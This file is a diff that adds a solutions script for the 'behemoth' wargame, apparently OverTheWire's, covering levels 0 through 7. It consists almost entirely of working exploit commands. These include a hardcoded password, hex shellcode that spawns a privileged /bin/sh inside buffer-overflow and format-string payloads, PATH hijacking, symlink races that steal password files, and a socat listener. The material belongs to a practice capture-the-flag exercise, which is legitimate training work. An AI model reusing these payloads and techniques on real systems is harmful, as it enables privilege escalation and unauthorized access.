@@ -1,0 +1,87 @@
+# behemoth0
+# run ltrace to check if password is encoded
+ltrace ./behemoth0
+# you now have escalated your access
+(echo 'eatmyshorts'; cat) | /behemoth/behemoth0;
+
+# behemoth1
+# debug using gdb, then send the payload exploiting buffer overflow
+# get the address of the return address on the stack ($ecx+0x4)
+(perl -e 'print "\x90"x27 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80\x31\xc0\xb0\x01\xcd\x80" . "\x58\xd6\xff\xff" . "\x20\xd6\xff\xff"'; cat) | /behemoth/behemoth1
+
+# behemoth2
+mkdir /tmp/d2
+cd /tmp/d2
+export PATH=$PWD:$PATH
+echo -e '#!/bin/bash\n\n/bin/dash' > touch
+chmod +x touch
+/behemoth/behemoth2
+
+# behemoth3
+# printf (format string vulnerability)
+# using gdb find the the return address, and create exploit to overwrite it exploiting the vulnerability
+# brute force to find the exact return address, gdb and actual process might differ in address
+# then create environment variable to house the shell code
+export EGG=`perl -e 'print "\x90"x100 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
+./bf.py <address of the return address> <address of the environment shell code>
+
+# behemoth4
+# run ltrace /behemoth/behemoth4, observe that the pid are incrementing
+# create a symbolic link from /etc/behemoth_pass/behemoth4 point to the pid file
+# create atleast 10 symbolic file, eg: 30860-30869 pid file
+ln -s /etc/behemoth_pass/behemoth5 /tmp/30860
+ln -s /etc/behemoth_pass/behemoth5 /tmp/30861
+ln -s /etc/behemoth_pass/behemoth5 /tmp/30862
+ln -s /etc/behemoth_pass/behemoth5 /tmp/30863
+ln -s /etc/behemoth_pass/behemoth5 /tmp/30864
+ln -s /etc/behemoth_pass/behemoth5 /tmp/30865
+ln -s /etc/behemoth_pass/behemoth5 /tmp/30866
+ln -s /etc/behemoth_pass/behemoth5 /tmp/30867
+ln -s /etc/behemoth_pass/behemoth5 /tmp/30868
+ln -s /etc/behemoth_pass/behemoth5 /tmp/30869
+# then run the script several times 
+/behemoth/behemoth4
+
+# behemoth5
+# ref: http://www.dest-unreach.org/socat/doc/socat-genericsocket.html
+# run gdb to debug the program. its basically sending data through socket
+# get the port (1337) by examining the $ebp register
+# construct the data presentation of the <local-address> for `socat` utilityi (nc/netcat not available), see ref above
+# the socket connection is using IPv4 or (AF_INET) as domain, we are using the IPv4 address specification 
+# open listener for the incoming socket connection via:
+socat - socket-recvfrom:2:2:0:x0539x7f000001x0000000000000000
+# x0539 = port 1337
+# 7f000001 = address 127.0.0.1
+# x0000000000000000 = zero-padding
+# then run to get the password in the listener above
+/behemoth/behemoth5
+
+# behemoth6
+# behemoth6_reader file reads a shellcode.txt located in the working directory and expects a shellcode in it to be executed,
+# however behemoth6 file executes behemoth6_reader and compares the output and HelloKitty, if match, you will get the shell
+# so you need to create a shellcode in shellcode.txt that prints HelloKitty in standard output
+cd $(mktemp -d)
+perl -e 'print "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x0a\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65\x6c\x6c\x6f\x4b\x69\x74\x74\x79"' > shellcode.txt
+ln -s /behemoth/behemoth6_reader reader
+ln -s /behemoth/behemoth6 behemoth
+./behemoth
+
+# behemoth7
+# run gdb to find the return address on the stack for you to create buffer overflow
+# please note that the file is checking for the input if it has a shell code, if the input has shell code it exist immediately
+# and environment variables are also removed by the program. The only way is to append the shell code in the argument right after
+# the return address of the payload, and point the return addresss to the address of the payload. 
+# You may need to bruteforce this since the address will differ in gdb against the actual process. So I wrote a script called bf7
+./bf7
+# the actual payload is:
+/behemoth/behemoth7 `python -c "print 'A'*536 + '$address' + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'"`
+
+
+
+
+
+
+
+
+
+
